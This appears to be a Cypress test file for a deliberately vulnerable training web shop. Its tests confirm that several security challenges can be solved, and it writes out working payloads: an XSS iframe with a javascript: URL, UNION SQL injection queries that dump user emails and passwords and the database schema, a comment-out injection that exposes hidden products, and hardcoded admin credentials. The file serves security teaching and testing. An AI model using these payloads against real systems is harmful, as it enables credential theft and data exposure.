import { Product } from "../../../data/types";

describe("/#/search", () => {
  beforeEach(() => {
    cy.visit("/#/search");
  });
  describe('challenge "localXss"', () => {
    // Cypress alert bug
    xit("search query should be susceptible to reflected XSS attacks", () => {
      cy.get("#searchQuery").click();
      cy.get("#mat-input-0")
        .type('<iframe src="javascript:alert(`xss`)">')
        .type("{enter}");
      cy.on("window:alert", (t) => {
        expect(t).to.equal("xss");
      });
      cy.expectChallengeSolved({ challenge: "DOM XSS" });
    });
  });
  describe('challenge "xssBonusPayload"', () => {
    it("search query should be susceptible to reflected XSS attacks", () => {
      cy.get("#searchQuery").click();
      cy.get("#mat-input-0")
        .type(
          '<iframe width="100%" height="166" scrolling="no" frameborder="no" allow="autoplay" src="https://w.soundcloud.com/player/?url=https%3A//api.soundcloud.com/tracks/771984076&color=%23ff5500&auto_play=true&hide_related=false&show_comments=true&show_user=true&show_reposts=false&show_teaser=true"></iframe>'
        )
        .type("{enter}");
      cy.expectChallengeSolved({ challenge: "Bonus Payload" });
    });
  });
});

describe("/rest/products/search", () => {
  describe('challenge "unionSqlInjection"', () => {
    it("query param in product search endpoint should be susceptible to UNION SQL injection attacks", () => {
      cy.request(
        "/rest/products/search?q=')) union select id,'2','3',email,password,'6','7','8','9' from users--"
      );
      cy.expectChallengeSolved({ challenge: "User Credentials" });
    });
  });

  describe('challenge "dbSchema"', () => {
    it("query param in product search endpoint should be susceptible to UNION SQL injection attacks", () => {
      cy.request(
        "/rest/products/search?q=')) union select sql,'2','3','4','5','6','7','8','9' from sqlite_master--"
      );
      cy.expectChallengeSolved({ challenge: "Database Schema" });
    });
  });

  describe('challenge "dlpPastebinLeakChallenge"', () => {
    beforeEach(() => {
      cy.login({
        email: "admin",
        password: "admin123",
      });
    });

    it("search query should logically reveal the special product", () => {
      cy.request("/rest/products/search?q='))--")
        .its("body")
        .then((sourceContent) => {
          cy.task("GetPastebinLeakProduct").then((productName: Product) => {
            let foundProduct = false;

            sourceContent.data.forEach((product) => {
              if (product.name === productName.name) {
                foundProduct = true;
              }
            });
            expect(foundProduct).to.be.true;
          });
        });
    });
  });

  xdescribe('challenge "christmasSpecial"', () => {
    beforeEach(() => {
      cy.login({
        email: "admin",
        password: "admin123",
      });
    });

    it("search query should reveal logically deleted christmas special product on SQL injection attack", () => {
      cy.request("/rest/products/search?q='))--")
        .its("body")
        .then((sourceContent) => {
          cy.task("GetChristmasProduct").then((productName: Product) => {
            let foundProduct = false;

            sourceContent.data.forEach((product: { name: string }) => {
              if (product.name === productName.name) {
                foundProduct = true;
                console.log(product);
              }
            });
            expect(foundProduct).to.be.true;
          });
        });
    });

    it("should be able to place Christmas product into shopping card by id", () => {
      cy.request("/api/products")
        .its("body")
        .then((sourceContent) => {
          cy.task("GetChristmasProduct").then((productName: Product) => {
            sourceContent.data.forEach((product: Product) => {
              if (product.name === productName.name) {
                console.log(product.id);
                cy.window().then(() => {
                  `var xhttp = new XMLHttpRequest(); xhttp.onreadystatechange = function () { if (this.status === 201) { console.log("Success") } } ; xhttp.open("POST", "${Cypress.env(
                    "baseUrl"
                  )}/api/BasketItems/", true); xhttp.setRequestHeader("Content-type", "application/json"); xhttp.setRequestHeader("Authorization", \`Bearer $\{localStorage.getItem("token")}\`); xhttp.send(JSON.stringify({"BasketId": \`$\{sessionStorage.getItem("bid")}\`, "ProductId":${
                    product.id
                  }, "quantity": 1}))`;
                });
              }
            });
          });
        });

      cy.visit("/#/basket");
      cy.get("#checkoutButton").click();
      cy.expectChallengeSolved({ challenge: "Christmas Special" });
    });
  });
});
